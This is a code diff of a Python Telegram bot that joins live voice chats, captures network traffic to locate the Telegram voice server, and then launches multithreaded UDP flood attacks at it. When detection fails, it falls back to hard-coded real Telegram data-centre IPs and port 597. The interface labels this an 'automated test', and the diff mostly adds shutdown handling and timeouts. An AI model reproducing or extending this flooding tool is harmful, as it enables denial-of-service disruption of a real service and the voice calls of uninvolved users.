@@ -10,6 +10,7 @@ import asyncio
 import os
 import html
 import json
+import signal
 import threading
 import time
 import socket
@@ -35,7 +36,7 @@ from voice_chat_handler import VoiceChatHandler
 
 load_dotenv()
 
-# ─── Config ─────────────────────────────────────────────────────────────────
+# ─── Config ───────────────────────────────────────────────────────────────────────
 API_ID         = int(os.getenv("API_ID", "0"))
 API_HASH       = os.getenv("API_HASH", "")
 STRING_SESSION = os.getenv("STRING_SESSION", "")
@@ -49,16 +50,12 @@ ATTACK_PACKET_SIZE  = 204
 ATTACK_DELAY        = 0.06
 
 # Real Telegram voice/STUN ports (UDP)
-# Source: Netify DPI + Wireshark captures
-# 1400        = STUN (Telegram NAT traversal)
-# 3478        = STUN (standard)
-# 596-599     = Telegram encrypted voice media
 TELEGRAM_VOICE_PORTS = [1400, 3478, 596, 597, 598, 599]
 
 # Local/private IP prefixes to exclude from voice-server detection
 _LOCAL_PREFIXES = ("127.", "10.", "192.168.", "::1", "fe80", "169.254.")
 
-# ─── Pyrogram userbot ───────────────────────────────────────────────────────
+# ─── Pyrogram userbot ───────────────────────────────────────────────────────────
 userbot = Client(
     name="tg_capturer",
     api_id=API_ID,
@@ -66,7 +63,7 @@ userbot = Client(
     session_string=STRING_SESSION,
 )
 
-# ─── Global state ───────────────────────────────────────────────────────────
+# ─── Global state ──────────────────────────────────────────────────────────────
 voice_chat_handler: VoiceChatHandler | None            = None
 voice_chats_cache:  dict[str, dict]                    = {}
 active_captures:    dict[int, NetworkCapture]          = {}
@@ -75,17 +72,15 @@ attack_running:     dict[int, bool]                    = {}
 attack_targets:     dict[int, tuple[str, int]]         = {}
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # IPv6 helper
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 def is_ipv6(addr: str) -> bool:
-    """Return True if addr looks like an IPv6 address."""
     return ":" in addr
 
 
 def make_udp_socket(target_ip: str) -> socket.socket:
-    """Create a UDP socket for the correct address family (IPv4 or IPv6)."""
     family = socket.AF_INET6 if is_ipv6(target_ip) else socket.AF_INET
     sock   = socket.socket(family, socket.SOCK_DGRAM)
     if family == socket.AF_INET6:
@@ -97,10 +92,8 @@ def make_udp_socket(target_ip: str) -> socket.socket:
 
 
 def _is_local_ip(ip: str) -> bool:
-    """Return True if the IP is a loopback/private/link-local address."""
     if any(ip.startswith(p) for p in _LOCAL_PREFIXES):
         return True
-    # 172.16.0.0/12
     if ip.startswith("172."):
         try:
             second_octet = int(ip.split(".")[1])
@@ -111,9 +104,9 @@ def _is_local_ip(ip: str) -> bool:
     return False
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # Extract voice server from pcap — 3-strategy, real Telegram ports
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
     """
@@ -171,7 +164,7 @@ def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
                 return (ip, int(port_str))
         return None
 
-    # ── Strategy 1: STUN ports ────────────────────────────────────────────────
+    # ── Strategy 1: STUN ports ─────────────────────────────────────────────────────
     for stun_port in [1400, 3478]:
         out = _run_tshark(f"udp.dstport == {stun_port}", count=1)
         if out:
@@ -181,7 +174,7 @@ def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
                 print(f"✅ Voice server via STUN:{stun_port} ({proto}): {result[0]}:{result[1]}")
                 return result
 
-    # ── Strategy 2: Known Telegram voice ports ───────────────────────────────
+    # ── Strategy 2: Known Telegram voice ports ───────────────────────────────────
     for tg_port in [596, 597, 598, 599]:
         out = _run_tshark(f"udp.dstport == {tg_port}", count=1)
         if out:
@@ -191,11 +184,10 @@ def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
                 print(f"✅ Voice server via TG-voice-port:{tg_port} ({proto}): {result[0]}:{result[1]}")
                 return result
 
-    # ── Strategy 3: Most active UDP destination (fallback) ───────────────────
-    # Skip DNS (53) and NTP (123) noise; grab everything else
+    # ── Strategy 3: Most active UDP destination (fallback) ───────────────────────
     out = _run_tshark(
         "udp && !udp.port == 53 && !udp.port == 123 && !udp.port == 67 && !udp.port == 68",
-        count=0,  # all packets
+        count=0,
     )
     if out:
         counter: Counter = Counter()
@@ -216,15 +208,11 @@ def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
     return None
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # Attack Engine — IPv4 AND IPv6 support
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 def udp_flood(target_ip: str, target_port: int, stop_flag: callable, thread_id: int):
-    """
-    UDP flood worker thread.
-    Automatically uses AF_INET6 for IPv6 targets and AF_INET for IPv4 targets.
-    """
     try:
         sock   = make_udp_socket(target_ip)
         packet = bytes([random.randint(0, 255) for _ in range(ATTACK_PACKET_SIZE)])
@@ -268,9 +256,9 @@ def stop_attack(uid: int):
         del attack_threads[uid]
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # Voice chat scanner
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 async def find_active_voice_chats() -> list[dict]:
     active = []
@@ -312,9 +300,9 @@ async def find_active_voice_chats() -> list[dict]:
     return active
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # Report formatter
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 def format_summary(vc_info: dict, r: dict) -> str:
     SEP = "═" * 35
@@ -336,7 +324,7 @@ def format_summary(vc_info: dict, r: dict) -> str:
     ) or "  • None"
     return f"""
 📡 <b>Network Capture Report</b>
-🎙️ Voice Chat: <b>{html.escape(vc_info['title'])}</b>  <code>({vc_info['type']})</code>
+🎤 Voice Chat: <b>{html.escape(vc_info['title'])}</b>  <code>({vc_info['type']})</code>
 {SEP}
 📊 <b>Bandwidth</b>
   • Duration      : <code>{r['duration']:.1f} s</code>
@@ -379,16 +367,16 @@ def build_vc_keyboard(vcs: list[dict]) -> tuple[dict, InlineKeyboardMarkup]:
         key = str(i)
         cache[key] = vc
         rows.append([InlineKeyboardButton(
-            f"🎙️ {vc['title'][:28]}  ({vc['type']})",
+            f"🎤 {vc['title'][:28]}  ({vc['type']})",
             callback_data=f"vc_{key}",
         )])
     rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
     return cache, InlineKeyboardMarkup(rows)
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # Bot handlers
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -476,7 +464,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("❌ Cache expired — use /start again.")
             return
         await query.edit_message_text(
-            f"🎙️ <b>{html.escape(vc_info['title'])}</b>\n\n"
+            f"🎤 <b>{html.escape(vc_info['title'])}</b>\n\n"
             f"⏳ Starting automated test…\n"
             f"🔬 Network monitoring <b>active</b>\n\n"
             f"Steps: join → mic×3 → leave → rejoin",
@@ -534,9 +522,9 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         asyncio.create_task(_finalize(vc_info, context, OWNER_ID))
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # Background test sequence
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str):
     chat_id = vc_info["id"]
@@ -554,17 +542,14 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
             parse_mode="HTML",
         )
 
-        # Step 1 — Join
         await voice_chat_handler.join_voice_chat(chat_id)
         capture.log_event("voice_chat_joined", vc_info["title"])
         await asyncio.sleep(2)
 
-        # First unmute — generates real voice UDP packets for detection
         await voice_chat_handler.toggle_mic(chat_id, muted=False)
         capture.log_event("mic_unmuted", "Cycle 1/3 — voice server detection window")
-        await asyncio.sleep(4)  # 4s to ensure packets appear in pcap
+        await asyncio.sleep(4)
 
-        # Extract real voice server from pcap (3-strategy detection)
         pcap_file = capture.get_pcap_file()
         target    = extract_voice_server_from_pcap(pcap_file) if pcap_file else None
 
@@ -580,10 +565,9 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
                 parse_mode="HTML",
             )
         else:
-            # Fallback: real known Telegram DC IPs + real voice port 597
-            fallback_ipv6 = "2001:b28:f23d:f001::e"  # DC1 IPv6
-            fallback_ipv4 = "149.154.167.51"           # DC2 IPv4 (most common)
-            fallback_port = 597                        # real Telegram voice port
+            fallback_ipv6 = "2001:b28:f23d:f001::e"
+            fallback_ipv4 = "149.154.167.51"
+            fallback_port = 597
             try:
                 test_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
                 test_sock.connect(("2001:4860:4860::8888", 80))
@@ -601,7 +585,6 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
                 parse_mode="HTML",
             )
 
-        # Remaining mic cycles
         await voice_chat_handler.toggle_mic(chat_id, muted=True)
         capture.log_event("mic_muted", "Cycle 1/3")
         await asyncio.sleep(3)
@@ -626,7 +609,6 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
             "(PPS spikes visible in the report when mic was ON)",
         )
 
-        # Step 3 — Leave
         await voice_chat_handler.leave_voice_chat(chat_id)
         capture.log_event("voice_chat_left", "TCP FIN sent → TIME_WAIT expected")
         await asyncio.sleep(5)
@@ -636,7 +618,6 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
             "(Watch for TIME_WAIT connections in the report)",
         )
 
-        # Step 4 — Rejoin
         await voice_chat_handler.join_voice_chat(chat_id)
         capture.log_event("voice_chat_rejoined", "New TCP handshake + DC IP")
         await asyncio.sleep(3)
@@ -727,9 +708,9 @@ async def _finalize(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, user_id: 
         await context.bot.send_message(user_id, f"❌ Report error:\n<code>{exc}</code>", parse_mode="HTML")
 
 
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 # Entry point
-# ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════
 
 async def main():
     global voice_chat_handler
@@ -757,7 +738,16 @@ async def main():
     await voice_chat_handler.start()
     print("✅ Voice chat handler ready")
 
-    application = Application.builder().token(BOT_TOKEN).build()
+    # ── Bot API with increased timeouts to avoid ReadTimeout on startup ─────────
+    application = (
+        Application.builder()
+        .token(BOT_TOKEN)
+        .read_timeout(30)
+        .write_timeout(30)
+        .connect_timeout(30)
+        .pool_timeout(30)
+        .build()
+    )
     application.add_handler(CommandHandler("start", cmd_start))
     application.add_handler(CommandHandler("help",  cmd_help))
     application.add_handler(CallbackQueryHandler(callback_handler))
@@ -766,15 +756,40 @@ async def main():
     print(f"   Test duration: {TEST_DURATION}s")
     print("═" * 60)
 
+    # ── Graceful shutdown via OS signals ─────────────────────────────────────
+    # Previously: asyncio.Event().wait() was cancelled by Ctrl+C before
+    # application.updater.stop() / application.stop() could run, causing:
+    #   RuntimeError: This Application is still running!
+    # Fix: use a signal-set Event so shutdown runs cleanly inside try/finally.
+    loop       = asyncio.get_event_loop()
+    stop_event = asyncio.Event()
+
+    def _on_signal():
+        print("\n🛑 Shutdown signal received…")
+        stop_event.set()
+
+    for sig in (signal.SIGINT, signal.SIGTERM):
+        try:
+            loop.add_signal_handler(sig, _on_signal)
+        except NotImplementedError:
+            pass  # Windows fallback: Ctrl+C will be caught by asyncio naturally
+
     async with application:
         await application.start()
         await application.updater.start_polling(drop_pending_updates=True)
         print("Polling started — press Ctrl+C to stop")
-        await asyncio.Event().wait()
-        await application.updater.stop()
-        await application.stop()
+        try:
+            await stop_event.wait()          # blocks until Ctrl+C / SIGTERM
+        finally:
+            # Always runs — ensures clean shutdown even on unexpected exceptions
+            print("🛑 Stopping attack threads…")
+            stop_attack(OWNER_ID)
+            print("🛑 Stopping bot polling…")
+            await application.updater.stop()
+            await application.stop()
 
     await userbot.stop()
+    print("✅ Shutdown complete.")
 
 
 if __name__ == "__main__":
